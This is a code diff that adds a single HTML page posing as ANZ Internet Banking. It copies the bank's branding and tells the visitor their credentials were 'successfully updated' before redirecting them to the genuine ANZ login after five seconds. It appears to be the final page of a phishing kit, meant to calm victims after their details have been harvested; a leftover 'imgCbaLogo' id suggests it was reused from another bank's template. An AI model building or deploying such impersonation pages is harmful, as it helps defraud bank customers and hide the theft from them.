@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ANZ Internet Banking</title>
+    <link rel="icon" href="favicon.ico">
+    <style>
+        @font-face {
+            font-family: 'MyriadPro';
+            src: url('files/MyriadPro-Regular.1.0.0.woff') format('woff');
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #004165;
+            text-align: center;
+            color: white;
+        }
+        h1 {
+            font-family: 'MyriadPro', Arial, sans-serif;
+            font-size: 1.2em;
+            margin-bottom: 20px;
+            color: white;
+        }
+        #countdown {
+            font-size: 0.9em;
+        }
+        header {
+            margin-bottom: 60px;
+        }
+        header img {
+            width: 300px;
+        }
+    </style>
+    <script>
+        let countdown = 5;
+        function updateCountdown() {
+            document.getElementById('countdown').textContent = countdown;
+            countdown--;
+            if (countdown < 0) {
+                window.location.href = "https://login.anz.com/internetbanking";
+            }
+        }
+        setInterval(updateCountdown, 1000);
+    </script>
+</head>
+<body>
+    <header>
+        <img id="imgCbaLogo" src="files/anz-logo.1.0.0.svg" alt="ANZ">
+    </header>
+    <div>
+        <h1>Credentials successfully updated, you may now safely close this tab or redirecting to home in <span id="countdown">5</span> seconds...</h1>
+    </div>
+</body>
+</html>
